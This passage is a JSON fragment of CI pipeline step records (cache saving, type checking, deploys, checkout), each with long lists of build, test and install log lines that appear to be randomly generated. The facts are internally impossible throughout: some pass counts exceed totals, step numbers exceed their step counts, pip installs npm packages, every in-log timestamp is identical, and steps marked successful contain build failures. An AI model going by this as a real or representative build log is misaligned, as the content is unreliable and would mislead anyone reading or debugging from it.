          "Compiling components/handler.rs...",
          "  PASS: e2e/test_api_health.spec.js",
          "NODE_ENV=test",
          "Connection established",
          "Cache restored successfully (415MB)",
          "GET /status - 201 (95ms)",
          "[12:46:17] DEBUG: Query executed in 8ms",
          "Creating production build...",
          "Uploading artifact 'dist' (33 files)",
          "Ready.",
          "Cache saved successfully",
          "\u2717 build failed with exit code 103",
          "Checking out master branch",
          "\u2713 Task completed in 1377ms",
          "\u2713 test completed",
          "Ready.",
          "Compiling src/handler.rs...",
          "[12:46:17] DEBUG: Connection pool: 14 active",
          "\u2713 Task completed in 2422ms",
          "\u2713 All checks passed",
          "Step 6/20: Running migrations",
          "[12:46:17] INFO: Connecting to database",
          "WARNING: react has known vulnerabilities",
          "\u2717 build failed with exit code 85",
          "pip: Downloading webpack-5.10.tar.gz",
          "yarn add: Done in 11.25s",
          "Cache saved successfully",
          "Optimizing 67 modules...",
          "Success!",
          "Step 19/18: Running migrations",
          "Done.",
          "Test Suites: 13 passed, 22 total",
          "Step 17/16: Linting",
          "WARNING: prettier has known vulnerabilities",
          "npm notice: created a lockfile",
          "[12:46:17] DEBUG: Memory usage: 1483MB",
          "Platform: darwin-arm64",
          "Test Suites: 6 passed, 22 total",
          "[12:46:17] INFO: Cache refreshed",
          "[12:46:17] INFO: Request completed",
          "pip: Collecting lodash",
          "WARNING: prettier has known vulnerabilities",
          "Test Suites: 34 passed, 41 total",
          "Step 18/19: Running migrations",
          "Artifact downloaded: 30MB",
          "Test Suites: 14 passed, 22 total",
          "Fetching submodules...",
          "Completed.",
          "Tests: 251 passed, 84 total",
          "Ran 114 tests in 28s",
          "Environment: staging",
          "Cache miss for key-7288",
          "NODE_ENV=development",
          "Artifact uploaded: build.tar.gz (34MB)",
          "WARNING: axios has known vulnerabilities",
          "WARNING: eslint has known vulnerabilities",
          "Layer 5/8: RUN command",
          "Connection established",
          "Completed.",
          "Cache miss for key-6161",
          "Switched to branch 'bugfix/task-661'",
          "Artifact uploaded: build.tar.gz (26MB)",
          "  PASS: integration/test_user_create.spec.js",
          "OK",
          "Cache restored successfully (326MB)",
          "Verifying...",
          "  PASS: test_db_connect (468ms)",
          "Cache saved successfully",
          "[12:46:17] INFO: Starting build process",
          "Snapshots: 9 passed, 15 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Completed.",
          "Pushing to registry...",
          "Platform: darwin-arm64",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: created a lockfile",
          "Bundling vendor.css",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing lodash@3.3.10",
          "Fetching from https://pypi.org/package.json",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Image pulled successfully",
          "[12:46:17] DEBUG: Connection pool: 2 active",
          "pip install: Successfully installed lodash-3.17",
          "Loading...",
          "[12:46:17] DEBUG: Loading configuration",
          "Cache miss for key-5318",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-16T12:46:35.730904",
        "finished_at": "2025-12-16T12:46:46.477668",
        "log_lines": [
          "=== Step: save_cache ===",
          "npm notice: created a lockfile",
          "Bundling vendor.css",
          "Test Suites: 36 passed, 21 total",
          "Already up to date.",
          "NODE_ENV=test",
          "Pushing to registry...",
          "Cache saved successfully",
          "Completed.",
          "WARNING: jest has known vulnerabilities",
          "[12:46:17] INFO: Connecting to database",
          "Bundling styles.css",
          "pip: Downloading express-2.6.tar.gz",
          "Creating production build...",
          "npm install: resolved 1859 packages",
          "Ready.",
          "Platform: darwin-arm64",
          "Done.",
          "Pushing to registry...",
          "Compiling lib/main.py...",
          "\u2713 validate completed",
          "Cache hit for key-6332",
          "Ran 176 tests in 54s",
          "  PASS: e2e/test_auth_login.spec.js",
          "Step 16/25: Building",
          "Step 11/18: Testing",
          "Already up to date.",
          "OK",
          "HEAD is now at 0bfb00f",
          "Compiling components/utils.go...",
          "Loading...",
          "Cache invalidated: build",
          "TLS handshake completed",
          "Installing jest@2.10.4",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Verifying...",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_user_create (178ms)",
          "Step 14/18: Running migrations",
          "pip install: Successfully installed lodash-1.3",
          "[12:46:17] INFO: Processing request",
          "[12:46:17] INFO: Starting build process",
          "Artifact uploaded: dist.zip (37MB)",
          "[12:46:17] WARN: Deprecated API usage",
          "Bundling styles.css",
          "Creating production build...",
          "POST /data - 202 (414ms)",
          "Generating source maps...",
          "Optimizing 93 modules...",
          "[12:46:17] ERROR: Connection failed",
          "Platform: linux-x64",
          "[12:46:17] WARN: Deprecated API usage",
          "[12:46:17] DEBUG: Loading configuration",
          "Compiling src/index.js...",
          "Step 6/20: Installing dependencies",
          "Environment: test",
          "npm install: added 483 packages",
          "Waiting...",
          "[12:46:17] DEBUG: Connection pool: 19 active",
          "Compiling lib/utils.go...",
          "Success!",
          "pip install: Successfully installed jest-2.8",
          "Pulling image: alpine:latest",
          "Already up to date.",
          "pip install: Successfully installed express-1.14",
          "Loading...",
          "Cache invalidated: dependencies",
          "Step 17/20: Testing",
          "[12:46:17] WARN: Deprecated API usage",
          "Processing...",
          "Coverage: 81% statements, 61% branches",
          "POST /data - 200 (201ms)",
          "[12:46:17] INFO: Request completed",
          "\u2713 lint completed",
          "Step 2/20: Testing",
          "Ran 193 tests in 9s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Tests: 258 passed, 82 total",
          "npm install: resolved 1581 packages",
          "Pushing to registry...",
          "GET /health - 201 (33ms)",
          "Step 19/20: Deploying",
          "Cache miss for key-3736",
          "Tests: 165 passed, 488 total",
          "Coverage: 87% statements, 93% branches",
          "HEAD is now at 5aed354",
          "Generating source maps...",
          "[12:46:17] WARN: Deprecated API usage",
          "Ready.",
          "Bundling vendor.css",
          "Fetching from https://amazonaws.com/package.json",
          "Ready.",
          "Compiling utils/index.js...",
          "Cache saved successfully",
          "[12:46:17] INFO: Processing request",
          "Uploading artifact 'build' (27 files)",
          "Test Suites: 31 passed, 49 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache miss for key-6455",
          "Step 8/22: Deploying",
          "[12:46:17] INFO: Connecting to database",
          "Completed.",
          "[12:46:17] WARN: Deprecated API usage",
          "\u2713 Step 'build' succeeded",
          "Cache restored successfully (84MB)",
          "Step 6/16: Installing dependencies",
          "pip: Collecting prettier",
          "Building Docker image...",
          "Ran 77 tests in 6s",
          "POST /api - 200 (13ms)",
          "Minifying app.js",
          "[12:46:17] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Coverage: 94% statements, 94% branches",
          "Platform: linux-x64",
          "[12:46:17] ERROR: Connection failed",
          "Uploading artifact 'dist' (42 files)",
          "Fetching from https://pypi.org/package.json",
          "Compiling src/utils.go...",
          "[12:46:17] DEBUG: Loading configuration",
          "Minifying vendor.js",
          "Step 3/15: Linting",
          "GET /health - 200 (25ms)",
          "[12:46:17] INFO: Connecting to database",
          "[12:46:17] INFO: Request completed",
          "Platform: win32-x64",
          "TLS handshake completed",
          "Cache miss for key-3473",
          "Processing...",
          "Connection established",
          "npm install: added 405 packages",
          "Image pulled successfully",
          "Layer 10/10: RUN command",
          "[12:46:17] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Artifact uploaded: dist.zip (20MB)",
          "Step 8/22: Testing",
          "Step 13/17: Deploying",
          "Connection established",
          "Installing lodash@5.5.8",
          "Tests: 84 passed, 111 total",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:17] DEBUG: Query executed in 49ms",
          "Compiling utils/main.py...",
          "WARNING: express has known vulnerabilities",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Success!",
          "Building Docker image...",
          "Environment: production",
          "  PASS: e2e/test_cache_hit.spec.js",
          "NODE_ENV=test",
          "Image pulled successfully",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-16T12:46:46.477668",
        "finished_at": "2025-12-16T12:47:04.388942",
        "log_lines": [
          "=== Step: type_check ===",
          "TLS handshake completed",
          "Environment: production",
          "pip: Collecting axios",
          "Step 12/25: Testing",
          "Ran 63 tests in 24s",
          "Installing prettier@5.9.1",
          "  PASS: test_user_create (39ms)",
          "Done.",
          "Exception: ValueError",
          "[12:46:17] WARN: Deprecated API usage",
          "Building Docker image...",
          "Verifying...",
          "WARNING: express has known vulnerabilities",
          "[12:46:17] DEBUG: Loading configuration",
          "Cache invalidated: dependencies",
          "Tests: 80 passed, 196 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "Minifying vendor.js",
          "[12:46:17] INFO: Cache refreshed",
          "Step 11/22: Building",
          "Transforming 526 files...",
          "[12:46:17] INFO: Connecting to database",
          "Already up to date.",
          "  PASS: integration/test_db_connect.spec.js",
          "Fetching from https://googleapis.com/package.json",
          "Connection established",
          "Step 14/24: Linting",
          "[12:46:17] WARN: Deprecated API usage",
          "Compiling components/service.java...",
          "TLS handshake completed",
          "Already up to date.",
          "[12:46:17] WARN: Deprecated API usage",
          "Transforming 900 files...",
          "Minifying app.js",
          "[12:46:17] WARN: Deprecated API usage",
          "[12:46:17] DEBUG: Loading configuration",
          "\u2713 Step 'build' succeeded",
          "Optimizing 66 modules...",
          "[12:46:17] DEBUG: Memory usage: 1732MB",
          "Building Docker image...",
          "Step 6/25: Linting",
          "[12:46:17] WARN: Deprecated API usage",
          "Compiling utils/app.ts...",
          "Success!",
          "Success!",
          "[12:46:17] DEBUG: Connection pool: 8 active",
          "[12:46:17] INFO: Processing request",
          "Creating production build...",
          "Using Python 3.12",
          "Compiling lib/service.java...",
          "Minifying vendor.js",
          "Bundling styles.js",
          "Transforming 215 files...",
          "Creating production build...",
          "Platform: darwin-arm64",
          "Step 12/17: Deploying",
          "Step 19/16: Running migrations",
          "Bundling styles.js",
          "Compiling src/app.ts...",
          "WARNING: prettier has known vulnerabilities",
          "Compiling utils/main.py...",
          "Image pulled successfully",
          "\u2713 Step 'checkout' succeeded",
          "npm install: resolved 1462 packages",
          "Cache invalidated: node_modules",
          "Artifact uploaded: dist.zip (37MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: package.json updated",
          "Fetching submodules...",
          "Cache hit for key-6077",
          "npm notice: package.json updated",
          "\u2717 build failed with exit code 49",
          "\u2713 All checks passed",
          "Layer 4/9: COPY command",
          "Installing webpack@5.11.0",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Image pulled successfully",
          "Tests: 168 passed, 327 total",
          "[12:46:17] INFO: Starting build process",
          "Building Docker image...",
          "pip: Downloading prettier-5.3.tar.gz",
          "\u2713 Task completed in 2907ms",
          "npm install: added 281 packages",
          "Pushing to registry...",
          "Pushing to registry...",
          "Test Suites: 49 passed, 48 total",
          "Minifying vendor.js",
          "\u2713 Task completed in 1244ms",
          "Layer 8/11: COPY command",
          "pip: Downloading webpack-3.6.tar.gz",
          "Compiling src/handler.rs...",
          "Step 19/18: Building",
          "[12:46:17] DEBUG: Connection pool: 19 active",
          "[12:46:17] DEBUG: Memory usage: 1064MB",
          "Cache restored successfully (476MB)",
          "Tests: 167 passed, 191 total",
          "Building Docker image...",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "  PASS: test_api_health (333ms)",
          "[12:46:17] DEBUG: Initializing service",
          "[12:46:17] WARN: Deprecated API usage",
          "Already up to date.",
          "Artifact uploaded: dist.zip (7MB)",
          "Compiling components/utils.go...",
          "[12:46:17] DEBUG: Loading configuration",
          "Using Python 3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Node.js 20.14.4",
          "npm notice: created a lockfile",
          "Uploading artifact 'coverage' (11 files)",
          "Platform: win32-x64",
          "Environment: production",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "Cache restored successfully (124MB)",
          "Switched to branch 'feature/task-891'",
          "Uploading artifact 'build' (48 files)",
          "Using Python 3.9",
          "npm notice: created a lockfile",
          "Cache restored successfully (168MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Transforming 662 files...",
          "\u2713 All checks passed",
          "Fetching from https://github.com/package.json",
          "Ran 199 tests in 7s",
          "npm notice: package.json updated",
          "Cache miss for key-5981",
          "Minifying app.js",
          "Cache invalidated: dependencies",
          "Generating source maps...",
          "\u2713 Task completed in 3860ms",
          "Artifact downloaded: 39MB",
          "\u2713 Step 'install' succeeded",
          "Artifact uploaded: dist.zip (87MB)",
          "[12:46:17] DEBUG: Memory usage: 321MB",
          "[12:46:17] DEBUG: Memory usage: 1755MB",
          "Environment: development",
          "pip: Installing build dependencies...",
          "Pulling image: python:latest",
          "npm notice: package.json updated",
          "Success!",
          "Done.",
          "[12:46:17] WARN: Deprecated API usage",
          "Tests: 466 passed, 70 total",
          "[12:46:17] INFO: Connecting to database",
          "Compiling src/utils.go...",
          "Switched to branch 'hotfix/task-343'",
          "Coverage: 94% statements, 89% branches",
          "Switched to branch 'bugfix/task-269'",
          "Building Docker image...",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-16T12:47:04.388942",
        "finished_at": "2025-12-16T12:47:11.553451",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Transforming 230 files...",
          "Environment: staging",
          "Done.",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 All checks passed",
          "Compiling components/utils.go...",
          "GET /status - 204 (97ms)",
          "Platform: linux-x64",
          "Environment: development",
          "Step 12/16: Linting",
          "[12:46:17] INFO: Cache refreshed",
          "Minifying main.js",
          "Optimizing 73 modules...",
          "[12:46:17] INFO: Cache refreshed",
          "[12:46:17] INFO: Connecting to database",
          "NODE_ENV=production",
          "Ready.",
          "pip: Collecting react",
          "[12:46:17] DEBUG: Connection pool: 12 active",
          "Environment: development",
          "npm notice: package.json updated",
          "Processing...",
          "HEAD is now at 803953e",
          "npm install: added 325 packages",
          "\u2713 Task completed in 3398ms",
          "pip: Downloading react-3.12.tar.gz",
          "Artifact downloaded: 42MB",
          "[12:46:17] DEBUG: Loading configuration",
          "Time: 44.795s",
          "Snapshots: 38 passed, 48 total",
          "Tests: 226 passed, 366 total",
          "Step 12/25: Running migrations",
          "Layer 9/15: RUN command",
          "Compiling utils/service.java...",
          "OK",
          "Layer 4/9: COPY command",
          "[12:46:17] INFO: Connecting to database",
          "Cache saved successfully",
          "HEAD is now at ff4f1b8",
          "pip: Collecting prettier",
          "Compiling src/index.js...",
          "  PASS: integration/test_api_health.spec.js",
          "Compiling src/utils.go...",
          "Generating source maps...",
          "Artifact uploaded: dist.zip (52MB)",
          "Platform: linux-x64",
          "Step 2/23: Linting",
          "Ran 28 tests in 32s",
          "Cache saved successfully",
          "Test Suites: 19 passed, 30 total",
          "Cache miss for key-7684",
          "yarn add: Done in 14.63s",
          "Verifying...",
          "\u2713 test completed",
          "Compiling components/service.java...",
          "[12:46:17] DEBUG: Loading configuration",
          "Installing express@4.14.1",
          "OK",
          "Compiling lib/index.js...",
          "TLS handshake completed",
          "\u2717 build failed with exit code 116",
          "[12:46:17] INFO: Connecting to database",
          "Creating production build...",
          "Step 1/24: Deploying",
          "Loading...",
          "Ran 119 tests in 1s",
          "Checking out master branch",
          "\u2713 Step 'build' succeeded",
          "[12:46:17] DEBUG: Connection pool: 19 active",
          "yarn add: Done in 24.13s",
          "[12:46:17] INFO: Cache refreshed",
          "FAILED: test_db_connect",
          "\u2713 All checks passed",
          "Step 2/23: Deploying",
          "Compiling components/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling utils/main.py...",
          "Test Suites: 49 passed, 26 total",
          "FAILED: test_db_connect",
          "Cache saved successfully",
          "Environment: staging",
          "[12:46:17] INFO: Request completed",
          "Using Python 3.11",
          "npm install: added 136 packages",
          "Fetching submodules...",
          "Image pulled successfully",
          "Transforming 665 files...",
          "Coverage: 80% statements, 76% branches",
          "Image pulled successfully",
          "Loading...",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Artifact downloaded: 6MB",
          "Artifact downloaded: 16MB",
          "Finished.",
          "TLS handshake completed",
          "Done.",
          "Pushing to registry...",
          "[12:46:17] WARN: Deprecated API usage",
          "\u2713 Step 'install' succeeded",
          "Done.",
          "Ran 81 tests in 7s",
          "WARNING: react has known vulnerabilities",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Downloading prettier-1.15.tar.gz",
          "Compiling components/utils.go...",
          "WARNING: jest has known vulnerabilities",
          "Image pulled successfully",
          "GET /status - 201 (85ms)",
          "Minifying app.js",
          "Generating source maps...",
          "[12:46:17] WARN: Deprecated API usage",
          "Cache hit for key-4050",
          "pip: Downloading prettier-2.7.tar.gz",
          "[12:46:17] WARN: Deprecated API usage",
          "HEAD is now at 88d7dea",
          "yarn add: Done in 10.90s",
          "Time: 99.31s",
          "WARNING: axios has known vulnerabilities",
          "TLS handshake completed",
          "  PASS: test_user_create (288ms)",
          "Artifact uploaded: dist.zip (58MB)",
          "Connection established",
          "OK",
          "Finished.",
          "Bundling styles.css",
          "Completed.",
          "[12:46:17] WARN: Deprecated API usage",
          "Using Python 3.11",
          "npm install: added 307 packages",
          "Step 6/19: Running migrations",
          "Cache miss for key-9486",
          "Cache hit for key-5513",
          "WARNING: react has known vulnerabilities",
          "[12:46:17] WARN: Deprecated API usage",
          "Ran 182 tests in 11s",
          "Fetching from https://npmjs.org/package.json",
          "pip install: Successfully installed eslint-1.12",
          "\u2713 lint completed",
          "Step 4/19: Deploying",
          "TLS handshake completed",
          "Uploading artifact 'coverage' (40 files)",
          "[12:46:17] WARN: Deprecated API usage",
          "Pulling image: alpine:latest",
          "Fetching from https://pypi.org/package.json",
          "  PASS: test_api_health (275ms)",
          "[12:46:17] INFO: Starting build process",
          "FAILED: test_api_health",
          "Artifact downloaded: 7MB",
          "Artifact downloaded: 14MB",
          "Coverage: 96% statements, 77% branches",
          "npm notice: created a lockfile",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-16T12:47:11.553451",
        "finished_at": "2025-12-16T12:47:29.464725",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Using Node.js 19.16.5",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:46:17] DEBUG: Initializing service",
          "OK",
          "Transforming 564 files...",
          "GET /status - 204 (81ms)",
          "\u2713 Step 'setup' succeeded",
          "Environment: test",
          "[12:46:17] ERROR: Connection failed",
          "\u2713 Task completed in 919ms",
          "pip install: Successfully installed webpack-3.3",
          "Installing react@4.9.10",
          "yarn add: Done in 30.84s",
          "npm install: resolved 1162 packages",
          "Minifying app.js",
          "Compiling components/index.js...",
          "Step 13/20: Testing",
          "Step 11/17: Testing",
          "\u2713 build completed",
          "Layer 2/15: ENV command",
          "Using Node.js 16.19.2",
          "Optimizing 32 modules...",
          "[12:46:17] INFO: Connecting to database",
          "Completed.",
          "Step 12/19: Deploying",
          "[12:46:17] DEBUG: Loading configuration",
          "Finished.",
          "\u2713 Step 'install' succeeded",
          "[12:46:17] WARN: Deprecated API usage",
          "Completed.",
          "Snapshots: 35 passed, 47 total",
          "[12:46:17] INFO: Processing request",
          "Step 9/16: Testing",
          "OK",
          "npm install: added 113 packages",
          "Step 2/17: Testing",
          "Cache miss for key-6909",
          "Artifact uploaded: dist.zip (11MB)",
          "Finished.",
          "Cache hit for key-6513",
          "Compiling utils/utils.go...",
          "[12:46:17] ERROR: Connection failed",
          "Artifact uploaded: dist.zip (95MB)",
          "Connection established",
          "[12:46:17] DEBUG: Loading configuration",
          "Coverage: 93% statements, 90% branches",
          "Processing...",
          "pip: Collecting webpack",
          "Using Node.js 20.18.0",
          "Test Suites: 37 passed, 30 total",
          "Waiting...",
          "[12:46:17] INFO: Cache refreshed",
          "[12:46:17] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (57MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:17] INFO: Starting build process",
          "Cache miss for key-9561",
          "Building Docker image...",
          "Cache restored successfully (438MB)",
          "Using Python 3.10",
          "Compiling utils/handler.rs...",
          "Snapshots: 47 passed, 46 total",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:46:17] ERROR: Connection failed",
          "Step 18/21: Deploying",
          "  PASS: integration/test_db_connect.spec.js",
          "Snapshots: 15 passed, 25 total",
          "npm notice: created a lockfile",
          "Ran 124 tests in 56s",
          "Ready.",
          "TLS handshake completed",
          "GET /status - 200 (99ms)",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Switched to branch 'hotfix/task-453'",
          "Compiling src/utils.go...",
          "[12:46:17] INFO: Starting build process",
          "Cache hit for key-7006",
          "[12:46:17] INFO: Connecting to database",
          "HEAD is now at 7a88380",
          "POST /api - 201 (230ms)",
          "\u2713 deploy completed",
          "  PASS: test_db_connect (281ms)",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (237ms)",
          "[12:46:17] DEBUG: Memory usage: 1031MB",
          "npm install: resolved 801 packages",
          "Finished.",
          "Platform: darwin-arm64",
          "Done.",
          "Waiting...",
          "Snapshots: 8 passed, 50 total",
          "[12:46:17] DEBUG: Initializing service",
          "Switched to branch 'bugfix/task-359'",
          "Compiling src/service.java...",
          "Ran 105 tests in 5s",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:17] INFO: Cache refreshed",
          "[12:46:17] ERROR: Connection failed",
          "pip: Collecting prettier",
          "Success!",
          "Artifact downloaded: 12MB",
          "Building Docker image...",
          "[12:46:17] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Exception: NullPointerException",
          "Cache restored successfully (131MB)",
          "Step 19/20: Linting",
          "[12:46:17] DEBUG: Memory usage: 559MB",
          "Ready.",
          "Minifying app.js",
          "Transforming 261 files...",
          "Cache miss for key-9725",
          "Processing...",
          "Artifact uploaded: dist.zip (73MB)",
          "[12:46:17] INFO: Starting build process",
          "Verifying...",
          "Time: 118.444s",
          "WARNING: prettier has known vulnerabilities",
          "Test Suites: 48 passed, 37 total",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Step 6/21: Installing dependencies",
          "Pulling image: alpine:3.11",
          "Generating source maps...",
          "\u2713 test completed",
          "GET /api - 201 (80ms)",
          "Ready.",
          "Artifact downloaded: 20MB",
          "Cache miss for key-4339",
          "Processing...",
          "Cache miss for key-4754",
          "TLS handshake completed",
          "Connection established",
          "Switched to branch 'hotfix/task-281'",
          "Cache hit for key-6887",
          "Fetching from https://registry.npmjs.org/package.json",
          "OK",
          "[12:46:17] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Completed.",
          "Coverage: 97% statements, 87% branches",
          "Step 2/21: Running migrations",
          "Step 2/19: Linting",
          "Verifying...",
          "Checking out develop branch",
          "Ran 15 tests in 37s",
          "Already up to date.",
          "Optimizing 98 modules...",
          "[12:46:17] DEBUG: Memory usage: 1147MB",
          "Step 7/16: Running migrations",
          "Success!",
          "Ready.",
          "\u2717 build failed with exit code 121",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-16T12:47:29.464725",
        "finished_at": "2025-12-16T12:47:36.629234",
        "log_lines": [
          "=== Step: checkout ===",
          "\u2713 Step 'install' succeeded",
          "[12:46:17] WARN: Deprecated API usage",
          "Tests: 72 passed, 58 total",
          "Layer 8/11: RUN command",
          "POST /api - 201 (416ms)",
          "yarn add: Done in 6.74s",
          "GET /health - 201 (80ms)",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 2MB",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Cache restored successfully (422MB)",
          "\u2713 Step 'test' succeeded",
          "POST /upload - 200 (328ms)",
          "[12:46:17] DEBUG: Query executed in 27ms",
          "Connection established",
          "pip: Installing build dependencies...",
          "Coverage: 87% statements, 100% branches",
          "Minifying app.js",
          "npm install: resolved 838 packages",
          "POST /api - 201 (343ms)",
          "Checking out develop branch",
          "[12:46:17] INFO: Starting build process",
          "\u2713 deploy completed",
          "Pushing to registry...",
          "GET /status - 204 (49ms)",
          "Compiling src/handler.rs...",
          "[12:46:17] DEBUG: Initializing service",
          "Cache restored successfully (392MB)",
          "npm notice: created a lockfile",
          "[12:46:17] INFO: Processing request",
          "[12:46:17] DEBUG: Query executed in 86ms",
          "Compiling src/utils.go...",
          "\u2713 Task completed in 1465ms",
          "Environment: test",
          "[12:46:17] DEBUG: Connection pool: 8 active",
          "TLS handshake completed",
          "Cache saved successfully",
          "Fetching from https://githubusercontent.com/package.json",
          "Pulling image: python:3.11",
          "HEAD is now at ed77df0",
          "Snapshots: 41 passed, 25 total",
          "Transforming 525 files...",
          "Cache hit for key-7171",
          "[12:46:17] DEBUG: Memory usage: 1548MB",
          "HEAD is now at c4201e6",
          "Compiling src/service.java...",
          "Finished.",
          "Pulling image: alpine:3.11",
          "\u2713 All checks passed",
          "npm install: resolved 1414 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 11/25: Testing",
          "[12:46:17] INFO: Request completed",
          "Step 6/17: Installing dependencies",
          "Fetching submodules...",
          "Step 9/20: Installing dependencies",
          "Installing lodash@4.8.5",
          "pip: Installing build dependencies...",
          "Switched to branch 'hotfix/task-485'",
          "Cache miss for key-6300",
          "Step 5/18: Linting",
          "[12:46:17] DEBUG: Connection pool: 5 active",
          "\u2713 Step 'checkout' succeeded",
          "Transforming 244 files...",
          "[12:46:17] WARN: Deprecated API usage",
          "Using Node.js 14.15.2",
          "[12:46:17] DEBUG: Query executed in 77ms",
          "\u2717 build failed with exit code 63",
          "[12:46:17] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "Completed.",
          "Transforming 590 files...",
          "[12:46:17] INFO: Processing request",
          "[12:46:17] DEBUG: Query executed in 87ms",
          "Building Docker image...",
          "Cache invalidated: dependencies",
          "pip install: Successfully installed lodash-3.19",
          "Ready.",
          "Platform: darwin-arm64",
          "pip install: Successfully installed eslint-5.0",
          "[12:46:17] DEBUG: Initializing service",
          "Pushing to registry...",
          "[12:46:17] DEBUG: Connection pool: 14 active",
          "Compiling src/main.py...",
          "Waiting...",
          "Environment: production",
          "Time: 83.615s",
          "Checking out master branch",
          "Loading...",
          "Done.",
          "[12:46:17] INFO: Connecting to database",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/utils.go...",
          "Building Docker image...",
          "Cache hit for key-3159",
          "[12:46:17] DEBUG: Connection pool: 8 active",
          "HEAD is now at 7ea711d",
          "Compiling utils/index.js...",
          "Snapshots: 25 passed, 10 total",
          "[12:46:17] WARN: Deprecated API usage",
          "TLS handshake completed",
          "\u2713 build completed",
          "pip: Downloading eslint-4.2.tar.gz",
          "Snapshots: 48 passed, 28 total",
          "Compiling lib/main.py...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:46:17] WARN: Deprecated API usage",
          "Using Python 3.12",
          "Layer 7/10: ENV command",
          "Optimizing 25 modules...",
          "\u2713 All checks passed",
          "Compiling src/service.java...",
          "Ran 128 tests in 46s",
          "pip install: Successfully installed lodash-3.13",
          "Generating source maps...",
          "[12:46:17] INFO: Connecting to database",
          "Switched to branch 'bugfix/task-729'",
          "[12:46:17] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-1853",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/utils.go...",
          "Step 11/19: Deploying",
          "[12:46:17] DEBUG: Query executed in 56ms",
          "  PASS: integration/test_api_health.spec.js",
          "\u2713 Step 'test' succeeded",
          "Completed.",
          "WARNING: axios has known vulnerabilities",
          "Environment: development",
          "[12:46:17] DEBUG: Connection pool: 8 active",
          "[12:46:17] DEBUG: Loading configuration",
          "pip: Collecting axios",
          "Cache restored successfully (305MB)",
          "Installing axios@2.18.1",
          "Environment: development",
          "\u2713 All checks passed",
          "FAILED: test_cache_hit",
          "NODE_ENV=production",
          "pip: Installing build dependencies...",
          "yarn add: Done in 12.82s",
          "Exception: RuntimeError",
          "\u2717 build failed with exit code 24",
          "Cache invalidated: node_modules",
          "[12:46:17] INFO: Starting build process",
          "Completed.",
          "Processing...",
          "[12:46:17] DEBUG: Initializing service",
          "Test Suites: 46 passed, 46 total",
          "Cache restored successfully (197MB)",
          "Pushing to registry...",
          "Fetching from https://amazonaws.com/package.json",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-16T12:47:36.629234",
        "finished_at": "2025-12-16T12:47:54.540508",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Cache restored successfully (137MB)",
          "Test Suites: 40 passed, 23 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-1467",
          "Installing lodash@1.20.7",
          "FAILED: test_cache_hit",
          "[12:46:17] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Already up to date.",
          "Platform: darwin-arm64",
          "[12:46:17] DEBUG: Connection pool: 16 active",
          "Compiling components/service.java...",
          "  PASS: unit/test_user_create.spec.js",
          "Step 18/17: Linting",
          "Pushing to registry...",
          "Fetching submodules...",
          "OK",
          "Checking out develop branch",
          "Tests: 184 passed, 137 total",
          "Step 14/22: Deploying",
          "Ran 55 tests in 15s",
          "\u2713 Step 'build' succeeded",
          "Done.",
          "WARNING: webpack has known vulnerabilities",
          "Minifying app.js",
          "pip install: Successfully installed webpack-2.20",
          "Image pulled successfully",
          "Creating production build...",
